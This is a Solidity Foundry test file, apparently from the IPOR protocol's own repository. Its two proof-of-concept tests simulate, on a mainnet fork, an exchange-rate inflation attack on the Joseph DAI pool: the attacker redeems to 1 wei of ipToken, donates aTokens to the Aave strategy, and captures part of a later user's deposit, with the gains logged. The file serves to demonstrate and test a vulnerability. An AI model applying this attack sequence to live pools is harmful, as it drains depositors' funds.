// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.16;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "../../TestCommons.sol";
import "../DaiAmm.sol";
import "../IAsset.sol";
import "../../../contracts/interfaces/IStrategy.sol";
import "../../../contracts/interfaces/IIvToken.sol";
import "../../../contracts/amm/MiltonDai.sol";
import "../../../contracts/amm/pool/JosephDai.sol";
import "../../../contracts/vault/StanleyDai.sol";
import "../../../contracts/vault/interfaces/aave/AaveLendingPoolProviderV2.sol";
import "../../../contracts/vault/interfaces/aave/AaveLendingPoolV2.sol";
import "../../../contracts/mocks/tokens/MockTestnetShareTokenCompoundDai.sol";

contract JosephAttackPoCOnFork is Test, TestCommons {
    address public constant aaveLendingPoolProviderV2 = 0xB53C1a33016B2DC2fF3653530bfF1848a515c8c5;
    // address public constant reachGuy = 0x60FaAe176336dAb62e284Fe19B885B095d29fB7F;

    address public owner = address(this);
    address public user = _getUserAddress(1);
    address public attacker = _getUserAddress(2);
    address public liquidityProvider = _getUserAddress(3);

    DaiAmm public daiAmm;

    address public dai;
    address public aDai;
    address public ipDai;
    Joseph public josephDai;
    Milton public miltonDai;
    Stanley public stanleyDai;

    StrategyAave public strategyAave;

    function setUp() public {
        daiAmm = new DaiAmm(address(this));
        dai = daiAmm.dai();
        aDai = daiAmm.aDai();
        ipDai = daiAmm.ipDai();
        strategyAave = daiAmm.strategyAave();
        josephDai = daiAmm.joseph();
        miltonDai = daiAmm.milton();
        stanleyDai = daiAmm.stanley();
    }

    function testAttackSuccess() public {
        // given

        AaveLendingPoolV2 lendingPool = AaveLendingPoolV2(
            AaveLendingPoolProviderV2(aaveLendingPoolProviderV2).getLendingPool()
        );

        uint256 userPosition = 1_000_000 * 1e18;
        uint256 attackerPosition = 3_000 * 1e18;
        uint256 attackerATokenPosition = 672_500 * 1e18;

        address compountStrategy = stanleyDai.getStrategyCompound();
        address compountSharedToken = IStrategy(compountStrategy).getShareToken();

        deal(daiAmm.dai(), owner, 700000 * 1e18);
        deal(daiAmm.dai(), user, userPosition);
        deal(daiAmm.dai(), attacker, attackerPosition + attackerATokenPosition);
        deal(daiAmm.dai(), liquidityProvider, 10 * 1e18);

        vm.prank(user);
        IAsset(dai).approve(address(josephDai), userPosition);

        vm.prank(attacker);
        IAsset(dai).approve(address(josephDai), attackerPosition);
        vm.prank(attacker);
        IAsset(dai).approve(address(lendingPool), attackerATokenPosition);

        vm.prank(liquidityProvider);
        IAsset(dai).approve(address(josephDai), 10 * 1e18);

        vm.roll(block.number + 100);

        vm.prank(attacker);
        lendingPool.deposit(dai, attackerATokenPosition, attacker, 0);

        vm.roll(block.number + 100);

        vm.prank(owner);
        josephDai.setMaxLiquidityPoolBalance(10_000_000);

        vm.prank(owner);
        josephDai.setMaxLpAccountContribution(10_000_000);

        // console2.log("NOW! INITIAL PROVIDE LIQUIDITY WHICH PROTECT POOL FROM ATTACK...");
        // vm.prank(liquidityProvider);
        // josephDai.provideLiquidity(10 * 1e18);

        /// WORKAROUND! Force "rebalance" in Stanley to create some ivToken
        /// (without this transfer aTokens will not have any influence on exchange rate)
        vm.prank(owner);
        IAsset(dai).transfer(address(miltonDai), 700000 * 1e18);
        vm.prank(owner);
        josephDai.depositToStanley(700000 * 1e18);

        vm.roll(block.number + 100);

        // force accrued interest when strategy with max apr is a compound
        MockTestnetShareTokenCompoundDai(compountSharedToken).accrueInterest();

        vm.prank(attacker);
        josephDai.provideLiquidity(attackerPosition);

        uint256 attackerIpTokenBalance_1 = IAsset(ipDai).balanceOf(attacker);

        // attacker redeem to achieve 1 wei ipToken balance
        vm.prank(attacker);
        josephDai.redeem(attackerIpTokenBalance_1 - 1);

        console2.log("attacker ipToken balance after redeem: ", IAsset(ipDai).balanceOf(attacker));

        console2.log("attacker erc20 balance after redeem: ", IAsset(dai).balanceOf(attacker));

        console2.log("ipToken TotalSupply:", IAsset(ipDai).totalSupply());

        /// attacker transfer aTokens
        vm.prank(attacker);
        IAsset(aDai).transfer(address(strategyAave), attackerATokenPosition);

        // user provide liquidity
        vm.prank(user);
        josephDai.provideLiquidity(userPosition);

        uint256 attackerIpTokenBalance_2 = IAsset(ipDai).balanceOf(attacker);
        console2.log("attackerIpTokenBalance: ", attackerIpTokenBalance_2);

        uint256 userIpTokenBalance = IAsset(ipDai).balanceOf(user);
        console2.log("userIpTokenBalance: ", userIpTokenBalance);

        vm.roll(block.number + 100);

        // force accrued interest when strategy with max apr is a compound
        MockTestnetShareTokenCompoundDai(compountSharedToken).accrueInterest();

        //user redeem
        vm.prank(user);
        josephDai.redeem(userIpTokenBalance);

        vm.roll(block.number + 100);

        // attacker redeem
        vm.prank(attacker);
        josephDai.redeem(attackerIpTokenBalance_2);

        console2.log("SUMMARY:");

        console2.log("user gain:");
        int256 userGain = int256(IAsset(dai).balanceOf(user)) - int256(userPosition);
        console.logInt(userGain);
        console.logInt(IporMath.divisionInt(userGain, Constants.D18_INT));

        console2.log("attacker gain:");

        int256 attackerBalance = int256(IAsset(dai).balanceOf(attacker)) -
            int256(attackerPosition + attackerATokenPosition);

        console.logInt(attackerBalance);
        console.logInt(IporMath.divisionInt(attackerBalance, Constants.D18_INT));

        console2.log("AMM liquidity pool balance:", miltonDai.getAccruedBalance().liquidityPool);
        console2.log(
            "AMM liquidity pool balance:",
            IporMath.division(miltonDai.getAccruedBalance().liquidityPool, Constants.D18)
        );
    }

    function testAttackSuccess2() public {
        // given

        AaveLendingPoolV2 lendingPool = AaveLendingPoolV2(
            AaveLendingPoolProviderV2(aaveLendingPoolProviderV2).getLendingPool()
        );

        uint256 userPosition = 1_000_000 * 1e18;
        uint256 attackerPosition = 3_000 * 1e18;
        uint256 attackerATokenPosition = 672_500 * 1e18;

        address compountStrategy = stanleyDai.getStrategyCompound();
        address compountSharedToken = IStrategy(compountStrategy).getShareToken();

        deal(daiAmm.dai(), owner, 700000 * 1e18);
        deal(daiAmm.dai(), user, userPosition);
        deal(daiAmm.dai(), attacker, attackerPosition + attackerATokenPosition);
        deal(daiAmm.dai(), liquidityProvider, 10 * 1e18);

        vm.prank(user);
        IAsset(dai).approve(address(josephDai), userPosition);

        vm.prank(attacker);
        IAsset(dai).approve(address(josephDai), attackerPosition);
        vm.prank(attacker);
        IAsset(dai).approve(address(lendingPool), attackerATokenPosition);

        vm.prank(liquidityProvider);
        IAsset(dai).approve(address(josephDai), 10 * 1e18);

        vm.roll(block.number + 100);

        vm.prank(attacker);
        lendingPool.deposit(dai, attackerATokenPosition, attacker, 0);

        vm.roll(block.number + 100);

        vm.prank(owner);
        josephDai.setMaxLiquidityPoolBalance(10_000_000);

        vm.prank(owner);
        josephDai.setMaxLpAccountContribution(10_000_000);

        // console2.log("NOW! INITIAL PROVIDE LIQUIDITY WHICH PROTECT POOL FROM ATTACK...");
        // vm.prank(liquidityProvider);
        // josephDai.provideLiquidity(10 * 1e18);

        /// WORKAROUND! Force "rebalance" in Stanley to create some ivToken
        /// (without this transfer aTokens will not have any influence on exchange rate)
        vm.prank(owner);
        IAsset(dai).transfer(address(miltonDai), 700000 * 1e18);
        vm.prank(owner);
        josephDai.depositToStanley(700000 * 1e18);

        vm.roll(block.number + 100);

        // force accrued interest when strategy with max apr is a compound
        MockTestnetShareTokenCompoundDai(compountSharedToken).accrueInterest();

        vm.prank(attacker);
        josephDai.provideLiquidity(attackerPosition);

        uint256 attackerIpTokenBalance_1 = IAsset(ipDai).balanceOf(attacker);

        // attacker redeem to achieve 1 wei ipToken balance
        vm.prank(attacker);
        josephDai.redeem(attackerIpTokenBalance_1 - 1);

        console2.log("attacker ipToken balance after redeem: ", IAsset(ipDai).balanceOf(attacker));

        console2.log("attacker erc20 balance after redeem: ", IAsset(dai).balanceOf(attacker));

        console2.log("ipToken TotalSupply:", IAsset(ipDai).totalSupply());

        /// attacker transfer aTokens
        vm.prank(attacker);
        IAsset(aDai).transfer(address(strategyAave), attackerATokenPosition);

        // user provide liquidity
        vm.prank(user);
        josephDai.provideLiquidity(userPosition);

        uint256 attackerIpTokenBalance_2 = IAsset(ipDai).balanceOf(attacker);
        console2.log("attackerIpTokenBalance: ", attackerIpTokenBalance_2);

        uint256 userIpTokenBalance = IAsset(ipDai).balanceOf(user);
        console2.log("userIpTokenBalance: ", userIpTokenBalance);

        vm.roll(block.number + 100);

        // force accrued interest when strategy with max apr is a compound
        MockTestnetShareTokenCompoundDai(compountSharedToken).accrueInterest();

        // attacker redeem
        vm.prank(attacker);
        josephDai.redeem(attackerIpTokenBalance_2);

        vm.roll(block.number + 100);

        //user redeem
        vm.prank(user);
        josephDai.redeem(userIpTokenBalance);

        console2.log("SUMMARY:");

        console2.log("user gain:");
        int256 userGain = int256(IAsset(dai).balanceOf(user)) - int256(userPosition);
        console.logInt(userGain);
        console.logInt(IporMath.divisionInt(userGain, Constants.D18_INT));

        console2.log("attacker gain:");

        int256 attackerBalance = int256(IAsset(dai).balanceOf(attacker)) -
            int256(attackerPosition + attackerATokenPosition);

        console.logInt(attackerBalance);
        console.logInt(IporMath.divisionInt(attackerBalance, Constants.D18_INT));

        console2.log("AMM liquidity pool balance:", miltonDai.getAccruedBalance().liquidityPool);
        console2.log(
            "AMM liquidity pool balance:",
            IporMath.division(miltonDai.getAccruedBalance().liquidityPool, Constants.D18)
        );
    }
}
